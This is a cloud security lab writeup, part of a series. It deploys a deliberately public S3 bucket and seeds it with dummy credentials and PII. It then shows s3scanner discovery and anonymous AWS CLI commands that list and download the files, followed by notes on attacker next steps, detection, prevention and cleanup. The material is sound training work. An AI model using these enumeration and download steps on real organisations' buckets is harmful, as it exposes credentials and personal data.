---
title: "Part 10 - Attack 1: Misconfigured S3 Bucket"
date: 2026-05-30
description: "Deploying a deliberately misconfigured public S3 bucket, discovering it via s3scanner, enumerating its contents, and downloading sensitive files including database credentials, API keys, and user data."

tags:
  - cybersecurity
  - cloudlab
  - ca101
  - aws

categories:
  - cloudlab writeup
  - cloud and attacks 101
---

> **Disclaimer:** All IAM credentials, public IP addresses, and sensitive data shown in this writeup have been removed, and the entire AWS environment was securely cleaned up prior to publication.


# Attack 1 — Misconfigured S3 Bucket

## Prerequisites

Before starting, I made sure the following were in place:

1. `projectx-prod-vpc` has been created with subnets configured
2. `My-Desktop-Key-Pair` key pair exists
3. AWS CLI configured with appropriate IAM credentials

## Scenario

The attacker has no prior access to the target environment. Through reconnaissance — either by using automated bucket discovery tools, spotting a bucket name in a public GitHub repository, or finding a URL in an error message from a web application — they discover a publicly accessible S3 bucket belonging to ProjectX. The bucket's Public Access Block settings are disabled and its bucket policy grants `s3:GetObject` to `Principal: "*"`. The attacker can list and download every file inside without providing any credentials.

## Overview

S3 bucket misconfigurations are one of the most consistently reported cloud security issues. They typically result from one of two things: a developer disabling the Public Access Block to make something temporarily accessible and forgetting to re-enable it, or copying a bucket policy template from the internet without fully understanding that `Principal: "*"` means anyone on the planet.

### What Makes an S3 Bucket Misconfigured?

- **Public Access Block disabled** — AWS now enforces these settings by default on new buckets, but legacy buckets and manually overridden settings are still common in production
- **Overly permissive bucket policy** — A policy with `Principal: "*"` and `Action: s3:GetObject` or `s3:ListBucket` grants public read access to any anonymous requester
- **ACLs allowing public access** — Object-level ACLs set to `public-read`, either intentionally for specific files or accidentally applied globally
- **Versioning without lifecycle controls** — Old versions of sensitive files (containing previous credentials or configurations) remain accessible even after the current version is updated

> In production, S3 buckets should always have all four Public Access Block settings enabled by default, with bucket policies following least privilege.

---

## Deploy the Misconfigured S3 Bucket

### Step 1 — Deploy via CloudFormation

I navigated to **CloudFormation → Create stack → Choose an existing template**.

I selected **Upload a template file** and upload `misconfigured-s3-bucket.yaml` from the exercise files repository (https://github.com/projectsecio/exercise-files/tree/main/cloud-attacks-101/attacks_cf_templates):

[Download Template](misconfigured_s3_bucket.yaml)

- **Stack name:** `misconfigured-s3-bucket`

Leave everything else default and select **Submit**.

> 📝 I added a unique suffix to the bucket name to ensure global uniqueness — S3 bucket names must be unique across all AWS accounts.

I waited for the stack to reach **CREATE_COMPLETE**.

![CloudFormation console showing the `misconfigured-s3-bucket` stack with `CREATE_COMPLETE` status — and the `Outputs` tab open showing the bucket name.](screenshot1.png)

---

### Step 2 — Populate the Bucket with Sample Sensitive Data

Create and run an upload script to add realistic sensitive files to the bucket:

```bash
nano upload_s3_files.sh
```

```bash
# Get the bucket name from CloudFormation outputs
BUCKET_NAME=$(aws cloudformation describe-stacks \
  --stack-name misconfigured-s3-bucket \
  --query 'Stacks[0].Outputs[?OutputKey==`BucketName`].OutputValue' \
  --output text)

# Create sample sensitive files
echo '{"db_host":"prod-database.internal","db_user":"admin","db_password":"SuperSecretPassword123!","db_name":"customer_data"}' > /tmp/database-credentials.json

echo 'user_id,email,ssn,credit_card
1,alice@projectxcorp.com,123-45-6789,4532-1234-5678-9010
2,bob@projectxcorp.com,987-65-4321,5555-1234-5678-9010' > /tmp/user-data-backup.csv

echo '2024-01-15 10:30:45 - Admin accessed sensitive data
2024-01-15 10:31:12 - User downloaded customer records
2024-01-15 10:32:00 - Database backup completed' > /tmp/access-logs.txt

echo 'AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
API_KEY=REDACTED_STRIPE_51HqSOFKmS3g3E5rK9XpZ8dN' > /tmp/api-keys.txt

# Upload files to S3
aws s3 cp /tmp/database-credentials.json s3://$BUCKET_NAME/config/database-credentials.json
aws s3 cp /tmp/user-data-backup.csv s3://$BUCKET_NAME/backups/user-data-backup.csv
aws s3 cp /tmp/access-logs.txt s3://$BUCKET_NAME/logs/access-logs.txt
aws s3 cp /tmp/api-keys.txt s3://$BUCKET_NAME/secrets/api-keys.txt

# Clean up local files
rm /tmp/database-credentials.json /tmp/user-data-backup.csv /tmp/access-logs.txt /tmp/api-keys.txt
```

```bash
chmod +x upload_s3_files.sh && bash upload_s3_files.sh
```

![Terminal showing the upload script running — each `aws s3 cp` command completing successfully and the four files confirmed uploaded to the bucket.](screenshot2.png)

---

## Discovery Phase

### Step 3 — Discover the Bucket with s3scanner

Time to put on the attacker hat.

Attackers find publicly exposed S3 buckets through various methods:
- **Automated tools** like `s3scanner` or `bucket_finder` that probe common naming patterns
- **Google Dorking** — searching for `site:s3.amazonaws.com` with company names
- **GitHub/GitLab** — bucket names hardcoded in source code or configuration files
- **Error messages** — applications that include bucket names in stack traces or 404 responses
- **Public datasets** — bucket URLs listed in public documentation or API specs

Install `s3scanner` on `project-x-attacker`:

```bash
sudo apt update && sudo apt install s3scanner -y
```

Scan the known bucket name (in a real attack, this comes from reconnaissance):

```bash
s3scanner -bucket delete-me-projectx-leaky-bucket-demo-[username]
```

![Terminal on `project-x-attacker` showing `s3scanner` output — `ALLUsers` showing `READ` permissions confirming the bucket is publicly accessible to any user.](screenshot3.png)

---

### Step 4 — Verify Public Access

I confirmed the bucket allows anonymous access using `--no-sign-request`:

```bash
aws s3 ls s3://delete-me-projectx-leaky-bucket-demo-[username] --no-sign-request
```

If this command succeeds without credentials, the bucket is publicly accessible. I also could open the bucket URL directly in a browser — if you see the bucket contents without being prompted to authenticate, the misconfiguration is confirmed.

![Terminal showing `aws s3 ls s3://delete-me-projectx-leaky-bucket-demo-[username] --no-sign-request` returning a list of objects — confirming anonymous read access. Side by side or below: a browser showing the S3 XML listing page without authentication.](screenshot4.png)

---

## Enumeration Phase

### Step 5 — List All Bucket Contents

Enumerate every object in the bucket recursively:

```bash
# List all objects with sizes and timestamps
aws s3 ls s3://delete-me-projectx-leaky-bucket-demo-[username] --recursive --no-sign-request

# Get a structured object listing
aws s3api list-objects-v2 \
  --bucket delete-me-projectx-leaky-bucket-demo-[username] \
  --no-sign-request \
  --query 'Contents[*].[Key,Size,LastModified]' \
  --output table
```

![Terminal showing the recursive `aws s3 ls` output — all four files visible with their full paths (`config/database-credentials.json`, `backups/user-data-backup.csv`, `logs/access-logs.txt`, `secrets/api-keys.txt`) listed.](screenshot5.png)

Pay attention to folder names and file naming patterns. The most interesting paths to an attacker:
- `config/` — application and database configuration files
- `secrets/` — API keys, tokens, credentials
- `backups/` — data exports that may contain PII or historical credentials
- `logs/` — access patterns, user behaviour, infrastructure details
- Files with extensions like `.json`, `.env`, `.pem`, `.csv`, `.sql`, `.key`

---

## Exploitation Phase

### Step 6 — Download Sensitive Files

Download all files of interest without credentials:

```bash
# Database credentials
aws s3 cp s3://delete-me-projectx-leaky-bucket-demo-[username]/config/database-credentials.json . --no-sign-request

# User PII backup
aws s3 cp s3://delete-me-projectx-leaky-bucket-demo-[username]/backups/user-data-backup.csv . --no-sign-request

# Access logs
aws s3 cp s3://delete-me-projectx-leaky-bucket-demo-[username]/logs/access-logs.txt . --no-sign-request

# API keys
aws s3 cp s3://delete-me-projectx-leaky-bucket-demo-[username]/secrets/api-keys.txt . --no-sign-request
```

![Terminal showing all four `aws s3 cp` commands completing without errors — each file downloaded to the current directory. Then `cat database-credentials.json` and `cat api-keys.txt` showing the contents of the most sensitive files.](screenshot6.png)

### What an Attacker Does With This

Based on the extracted data, an attacker's next moves:

- **`database-credentials.json`** — attempt a direct connection to the production database using the host, user, and password extracted. If the database port is publicly accessible (a separate misconfiguration), this is game over for customer data
- **`user-data-backup.csv`** — SSNs and credit card numbers for direct fraud or sale; email addresses for phishing campaigns
- **`api-keys.txt`** — the AWS access key can be used to enumerate and access other AWS resources; the API key can be used to incur charges or access third-party services
- **`access-logs.txt`** — reveals internal system names, user behaviour patterns, and timing of admin activity — useful for planning the next stage of an attack

---

## Detection and Prevention

**How to detect this:**
- **AWS Config rule `s3-bucket-public-read-prohibited`** — flags any bucket with public read access enabled
- **CloudTrail** — `GetObject` calls from unauthenticated requesters (`userIdentity.type: Anonymous`) stand out immediately
- **GuardDuty** — flags S3 public access anomalies and unusual download patterns
- **Access Analyzer** — proactively identifies S3 buckets accessible outside your account

**How to prevent it:**
- Enable all four **Public Access Block** settings at the account level — this overrides any bucket-level setting and is the strongest protection
- Audit bucket policies regularly and flag any `Principal: "*"` entries
- Store secrets in **AWS Secrets Manager** rather than S3 — never commit credentials to object storage
- Enable **S3 server access logging** and alert on unauthenticated access
- Run **AWS Trusted Advisor** or **Security Hub** checks for public bucket findings

---

## Cleanup

> Empty the S3 bucket before deleting the stack — CloudFormation cannot delete a non-empty bucket.

```bash
# Empty the bucket first
BUCKET_NAME=$(aws cloudformation describe-stacks \
  --stack-name misconfigured-s3-bucket \
  --query 'Stacks[0].Outputs[?OutputKey==`BucketName`].OutputValue' \
  --output text)

aws s3 rm s3://$BUCKET_NAME --recursive

# Delete the CloudFormation stack
aws cloudformation delete-stack --stack-name misconfigured-s3-bucket
aws cloudformation wait stack-delete-complete --stack-name misconfigured-s3-bucket
```

---

*Next up — Part 11 - Attack 2: Metadata SSRF Attack on EC2.*
